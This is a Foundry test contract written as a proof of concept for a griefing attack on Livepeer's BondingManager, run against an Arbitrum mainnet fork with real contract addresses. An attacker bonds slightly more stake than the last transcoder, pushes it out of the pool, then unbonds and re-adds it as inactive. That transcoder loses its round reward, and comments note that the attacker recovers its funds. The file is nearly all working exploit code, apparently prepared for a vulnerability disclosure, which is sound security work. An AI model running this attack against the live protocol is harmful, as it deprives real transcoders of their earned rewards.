// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

import {GovernorBaseTest} from "./base/GovernorBaseTest.sol";
import "forge-std/console.sol";

import "contracts/token/LivepeerToken.sol";

interface IERC20 {
    function transfer(address to, uint amount) external returns (bool);
    function approve(address to, uint amount) external returns (bool);
    function balanceOf(address to) external returns (uint);
}

interface IBondingManager {
    struct TranscoderData {
        uint256 lastRewardRound;
        uint256 rewardCut;
        uint256 feeShare;
        uint256 lastActiveStakeUpdateRound;
        uint256 activationRound;
        uint256 deactivationRound;
        uint256 activeCumulativeRewards;
        uint256 cumulativeRewards;
        uint256 cumulativeFees;
        uint256 lastFeeRound;
    }

    struct TranscoderEarningsPoolData {
        uint256 totalStake;
        uint256 transcoderRewardCut;
        uint256 transcoderFeeShare;
        uint256 cumulativeRewardFactor;
        uint256 cumulativeFeeFactor;
    }

    struct DelegatorData {
        uint256 bondedAmount;
        uint256 fees;
        address delegateAddress;
        uint256 delegatedAmount;
        uint256 startRound;
        uint256 lastClaimRound;
        uint256 nextUnbondingLockId;
    }

    function reward() external;
    function bond(uint256 _amount, address _to) external;
    function unbond(uint256 _amount) external;
    function transcoder(uint256 _rewardCut, uint256 _feeShare) external;
    function claimEarnings(uint256 _endRound) external;

    function getFirstTranscoderInPool() external view returns (address);
    function getNextTranscoderInPool(address _transcoder) external view returns (address);
    function getTranscoderEarningsPoolForRound(address _transcoder, uint256 _round) external view returns (TranscoderEarningsPoolData memory);
    function getTranscoder(address _transcoder) external view returns (TranscoderData memory);
    function getDelegator(address _delegator) external view returns (DelegatorData memory);
}

interface IRoundManager {
    function roundLength() external returns (uint);
    function currentRound() external view returns (uint256);
    function initializeRound() external;
}

// forge test --match-contract BondingManagerGriefLastTranscoderRewardPoc --fork-url https://arbitrum-mainnet.infura.io/v3/$INFURA_KEY -vvv --fork-block-number 290482185
contract BondingManagerGriefLastTranscoderRewardPoc is GovernorBaseTest {
    LivepeerToken public constant lpt = LivepeerToken(0x289ba1701C2F088cf0faf8B3705246331cB8A839);
    address minter = 0xc20DE37170B45774e6CD3d2304017fc962f27252;

    IBondingManager bondingManager = IBondingManager(0x35Bcf3c30594191d53231E4FF333E8A770453e40);
    IRoundManager roundManager = IRoundManager(0xdd6f56DcC28D3F5f27084381fE8Df634985cc39f);

    uint roundLength;

    function setUp() public {
        roundLength = roundManager.roundLength();
    }

    function _skipToNextRound() internal {
        CHEATS.roll(block.number + roundLength);
        roundManager.initializeRound();

        console.log("\n---------------------- ROUND = %s ----------------------", roundManager.currentRound());
    }

    function _getDelegatorData(address del) internal view returns (IBondingManager.DelegatorData memory) {
        return bondingManager.getDelegator(del);
    }

    function _getTransoderEarningPoolData(address del, uint round) internal view returns (IBondingManager.TranscoderEarningsPoolData memory) {
        return bondingManager.getTranscoderEarningsPoolForRound(del, round);
    }

    function _getTranscoderData(address del) internal view returns (IBondingManager.TranscoderData memory) {
        return bondingManager.getTranscoder(del);
    }

    function _getLastTranscoder() internal view returns (address lastTranscoder) {
        lastTranscoder = bondingManager.getFirstTranscoderInPool();
        for (uint i = 1; i < 100; ++i) {
            lastTranscoder = bondingManager.getNextTranscoderInPool(lastTranscoder);
        }
    }

    function test_poc() public {
        address hacker = newAddr();
        address lastTranscoder = _getLastTranscoder();

        /// attacker need 450 + 2 lpt to execute the attack
        CHEATS.prank(minter);
        lpt.mint(hacker, 450 * 1e18 + 2);

        /// ---------------------- ROUND = 3639 ----------------------
        _skipToNextRound();

        /// attacker bond for themself to make their status in the next round become "Bonded"
        CHEATS.startPrank(hacker);
        lpt.approve(address(bondingManager), type(uint).max);
        bondingManager.bond(1, hacker);
        CHEATS.stopPrank();

        /// ---------------------- ROUND = 3640 ----------------------
        _skipToNextRound();

        /// attacker bond more than the last transcoder and kick them out of the `transcoderPool`
        CHEATS.startPrank(hacker);
        bondingManager.bond(450 * 1e18, hacker);
        assertEq(hacker, _getLastTranscoder());

        /// attacker unbond all to make the `transcoderPool` not full
        bondingManager.unbond(_getDelegatorData(hacker).bondedAmount);

        /// the `lastTranscoder` is added into the `transcoderPool` again and become deactivated.
        bondingManager.bond(1, lastTranscoder);
        CHEATS.stopPrank();

        assertEq(_getTranscoderData(lastTranscoder).activationRound, roundManager.currentRound() + 1);

        /// the `lastTranscoder` is unable to claim the reward for ROUND = 3640 because it's considered as inactivate
        // CHEATS.expectRevert(bytes("caller must be an active transcoder"));
        CHEATS.prank(lastTranscoder);
        bondingManager.reward();
        console.log(_getTranscoderData(lastTranscoder).deactivationRound);

        /// Note that the attacker can still withdraw all the fund they use for the attack at the withdrawRound
    }

    receive() external payable {}
}
